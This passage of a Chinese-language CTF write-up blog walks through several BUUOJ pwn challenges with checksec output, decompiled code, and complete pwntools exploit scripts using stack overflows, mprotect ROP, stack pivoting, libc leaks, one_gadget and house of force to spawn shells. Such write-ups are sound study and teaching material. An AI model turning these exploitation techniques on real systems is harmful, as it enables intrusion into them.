<p>s 和 vuln里面dest 的ebp 的距离</p>
</blockquote>
<blockquote>
<p>memchr比较前十个字符串</p>
</blockquote>
<h3 id="3exp-28"><a class="markdownIt-Anchor" href="#3exp-28"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29397</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./ez_pz_hackover_2016&quot;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Yippie, lets crash: 0x&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack_addr)</span><br><span class="line">payload = <span class="string">&quot;crashme\x00&quot;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x32</span>+<span class="number">4</span>) </span><br><span class="line">payload += p32(stack_addr-(<span class="number">0x40</span>-<span class="number">0x32</span>+<span class="number">4</span>+<span class="number">10</span>)) + asm(shellcraft.sh())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="get_started_3dsctf_2016"><a class="markdownIt-Anchor" href="#get_started_3dsctf_2016"></a> get_started_3dsctf_2016</h2>
<h3 id="1checksec-39"><a class="markdownIt-Anchor" href="#1checksec-39"></a> 1.checksec()</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-38"><a class="markdownIt-Anchor" href="#2ida-38"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+4h] [ebp-38h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>get_flag</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">get_flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">814536271</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = v2;</span><br><span class="line">    v4 = getc(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="type">char</span>)v4;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v5);</span><br><span class="line">        v6 = getc(v3);</span><br><span class="line">        v5 = (<span class="type">char</span>)v6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v6 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其实主要分析可知，这个程序的大致意思是修改eip改变程序流，最后执行cat_flag<br />
但是BUU远程打不通，要使用mprotec函数修改内存的权限为可读可写可执行，再使用read函数写入shellcode到被解放的bss段</p>
</blockquote>
<ul>
<li><strong>mprotect</strong>原型</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure>
<p>所以我们需要三个参数，就要ppp_ret</p>
<h3 id="3exp-29"><a class="markdownIt-Anchor" href="#3exp-29"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28495</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">pop3_ret = <span class="number">0x0804951D</span></span><br><span class="line">get_flag = <span class="number">0x080489A0</span></span><br><span class="line">got_addr = <span class="number">0x080EB000</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload += p32(pop3_ret)+p32(got_addr)+p32(<span class="number">0x1d8c</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(pop3_ret)+p32(<span class="number">0</span>)+p32(got_addr)+p32(<span class="number">0x100</span>)+p32(got_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload=asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="gyctf_2020_borrowstack"><a class="markdownIt-Anchor" href="#gyctf_2020_borrowstack"></a> gyctf_2020_borrowstack</h2>
<h3 id="1checksec-40"><a class="markdownIt-Anchor" href="#1checksec-40"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-39"><a class="markdownIt-Anchor" href="#2ida-39"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x70</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!You can check and use your borrow stack now!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;bank, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第一步栈迁移，第二步抬高栈了过后<code>libc leak</code>，程序返回至第一个read，第三步<code>one gadget</code>来getshell</p>
</blockquote>
<h3 id="3exp-30"><a class="markdownIt-Anchor" href="#3exp-30"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25707</span>)</span><br><span class="line"></span><br><span class="line">bank=<span class="number">0x0601080</span></span><br><span class="line">leave=<span class="number">0x400699</span></span><br><span class="line">puts_plt=<span class="number">0x04004E0</span></span><br><span class="line">puts_got=<span class="number">0x0601018</span></span><br><span class="line">pop_rdi=<span class="number">0x400703</span></span><br><span class="line">main=<span class="number">0x0400626</span></span><br><span class="line">ret=<span class="number">0x4004c9</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;u want&#x27;</span>)</span><br><span class="line">pl1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(bank)+p64(leave)</span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;now!&#x27;</span>)</span><br><span class="line">pl2=p64(ret)*<span class="number">20</span>		<span class="comment">#抬高栈</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ret指令用栈中的数据，修改IP的值，从而实现近转移。</span></span><br><span class="line"><span class="string">CPU执行ret指令时，进行下面两步操作：</span></span><br><span class="line"><span class="string">(IP)=((SS)*16+(SP))</span></span><br><span class="line"><span class="string">(SP)=(SP)+2;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pl2+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">io.send(pl2)</span><br><span class="line">io.recvline()</span><br><span class="line">puts_add=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_add-<span class="number">0x06f690</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4526a</span></span><br><span class="line">pl3=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+<span class="string">&#x27;bbbbbbbb&#x27;</span>+p64(one_gadget)</span><br><span class="line">io.send(pl3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="gyctf_2020_force"><a class="markdownIt-Anchor" href="#gyctf_2020_force"></a> gyctf_2020_force</h2>
<h3 id="1checksec-41"><a class="markdownIt-Anchor" href="#1checksec-41"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h3 id="2ida-40"><a class="markdownIt-Anchor" href="#2ida-40"></a> 2.IDA</h3>
<p>有用的基本只有add</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;bin addr &quot;</span>)</span><br><span class="line">	addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(), <span class="number">16</span>)</span><br><span class="line">	p.sendafter(<span class="string">&quot;content\n&quot;</span>,text)</span><br><span class="line">	<span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure>
<p><strong>add</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, nptr, <span class="number">0xF</span>uLL);</span><br><span class="line">size = atol(nptr);</span><br><span class="line">*(_QWORD *)i = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> ( !*(_QWORD *)i )</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<blockquote>
<p><strong>add</strong>会返回堆的地址，所以可以利用这个来获取偏移量</p>
</blockquote>
<blockquote>
<p><strong>add</strong>同时存在堆溢出，使得我们可以覆盖 <strong>top chunk</strong>的 <strong>size</strong>域</p>
</blockquote>
<blockquote>
<p>可以多次申请。综上，符合house of force的攻击条件</p>
</blockquote>
<blockquote>
<p>1.libc leak	2.hof	3.malloc_hook+one gadget</p>
</blockquote>
</blockquote>
<h3 id="3gdb-7"><a class="markdownIt-Anchor" href="#3gdb-7"></a> 3.GDB</h3>
<h4 id="0x1-libc-leak"><a class="markdownIt-Anchor" href="#0x1-libc-leak"></a> 0x1 libc leak</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1:add</span><br><span class="line">2:puts</span><br><span class="line">1</span><br><span class="line">size</span><br><span class="line">2097152 </span><br><span class="line">bin addr 0x7ffff780c010</span><br><span class="line">content</span><br><span class="line">aaaa</span><br><span class="line">&gt;vmmap</span><br><span class="line">0x7ffff780c000     0x7ffff7a0d000 rw-p   201000 0      </span><br><span class="line">0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">&gt;In python</span><br><span class="line">&gt;&gt;&gt; hex(0x7ffff7a0d000 - 0x7ffff780c010)</span><br><span class="line">&#x27;0x200ff0&#x27;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>得到偏移 <strong>0x200ff0</strong></p>
</blockquote>
<h4 id="0x2-house-of-force"><a class="markdownIt-Anchor" href="#0x2-house-of-force"></a> 0x2 house of force</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code:</span></span><br><span class="line">	addr = add(<span class="number">0x200000</span>,<span class="string">&#x27;aaaaaa&#x27;</span>)</span><br><span class="line">	base = addr + <span class="number">0x200ff0</span></span><br><span class="line">	log.success(<span class="string">&quot;libc base &gt;&gt;0x%x&quot;</span>,base)</span><br><span class="line">	top = add(<span class="number">0x18</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xffffffffffffffff</span>))+<span class="number">0x10</span></span><br><span class="line">	log.success(<span class="string">&quot;top chunk &gt;&gt;0x%x&quot;</span>,top)</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="comment">#gdb:</span></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x5559b4dfa000</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x6161616161616161</span>, </span><br><span class="line">  bk = <span class="number">0x6161616161616161</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0xffffffffffffffff</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x/12gx <span class="number">0x5559b4dfa000</span></span><br><span class="line"><span class="number">0x55d5b01aa000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x55d5b01aa010</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55d5b01aa020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x55d5b01aa030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="comment">#输出:</span></span><br><span class="line">[+] Starting local process <span class="string">&#x27;./gyctf_2020_force&#x27;</span>: pid <span class="number">50956</span></span><br><span class="line">[+] libc base &gt;&gt;<span class="number">0x7fc48892d000</span></span><br><span class="line">[+] top chunk &gt;&gt;<span class="number">0x55d5b01aa020</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code:</span></span><br><span class="line">	add((offset-<span class="number">0x33</span>),<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">  <span class="comment">#考虑到内存对齐，经过调试可得offset-0x33时，可以申请到malloc_hook-0x21的内存</span></span><br><span class="line">	add(<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>+p64(one_gadget)+p64(realloc+<span class="number">16</span>))</span><br><span class="line"><span class="comment">#gdb:</span></span><br><span class="line"><span class="number">0x7f7a6909aaef</span> &lt;_IO_wide_data_0+<span class="number">303</span>&gt;:	<span class="number">0x007f7a6909926000</span>	<span class="number">0x0000000000002100</span></span><br><span class="line"><span class="number">0x7f7a6909aaff</span>:	<span class="number">0x6161616161616100</span>	<span class="number">0x007f7a68d1b26a61</span></span><br><span class="line"><span class="number">0x7f7a6909ab0f</span> &lt;__realloc_hook+<span class="number">7</span>&gt;:	<span class="number">0x007f7a68d5a6d000</span>	<span class="number">0xffd61c20d2750900</span>	&lt;-这里调整堆栈，使one gadget可用</span><br><span class="line"><span class="number">0x7f7a6909ab1f</span>:	<span class="number">0x00000100000000ff</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<h3 id="4exp-11"><a class="markdownIt-Anchor" href="#4exp-11"></a> 4.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./gyctf_2020_force&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./gyctf_2020_force&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,&quot;28528&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;puts\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">	addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">	p.sendafter(<span class="string">&quot;content\n&quot;</span>,text)</span><br><span class="line">	<span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	addr = add(<span class="number">0x200000</span>,<span class="string">&#x27;aaaaaa&#x27;</span>)</span><br><span class="line">	base = addr + <span class="number">0x200ff0</span></span><br><span class="line">	log.success(<span class="string">&quot;libc base &gt;&gt;0x%x&quot;</span>,base)</span><br><span class="line">	top = add(<span class="number">0x18</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xffffffffffffffff</span>))+<span class="number">0x10</span></span><br><span class="line">	log.success(<span class="string">&quot;top chunk &gt;&gt;0x%x&quot;</span>,top)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">	malloc_hook = base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">	realloc = base+libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line">	one_gadget = <span class="number">0x4526a</span> + base</span><br><span class="line">	offset = malloc_hook-top</span><br><span class="line"></span><br><span class="line">	log.success(<span class="string">&quot;malloc hook &gt;&gt;0x%x&quot;</span>,malloc_hook)</span><br><span class="line">	log.success(<span class="string">&quot;realloc hook &gt;&gt;0x%x&quot;</span>,realloc)</span><br><span class="line">	log.success(<span class="string">&quot;offset &gt;&gt;0x%x&quot;</span>,offset)</span><br><span class="line"></span><br><span class="line">	add((offset-<span class="number">0x33</span>),<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">	add(<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>+p64(one_gadget)+p64(realloc+<span class="number">16</span>))</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">    </span><br><span class="line">	p.sendlineafter(<span class="string">&quot;puts\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="gyctf_2020_some_thing_exceting"><a class="markdownIt-Anchor" href="#gyctf_2020_some_thing_exceting"></a> gyctf_2020_some_thing_exceting</h2>
<h3 id="1checksec-42"><a class="markdownIt-Anchor" href="#1checksec-42"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-41"><a class="markdownIt-Anchor" href="#2ida-41"></a> 2.IDA</h3>
<p>三大功能</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">ba_sz,ba_text,na_sz,na_text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(ba_sz))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(ba_text))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(na_sz))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(na_text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
<p><strong>flag</strong></p>
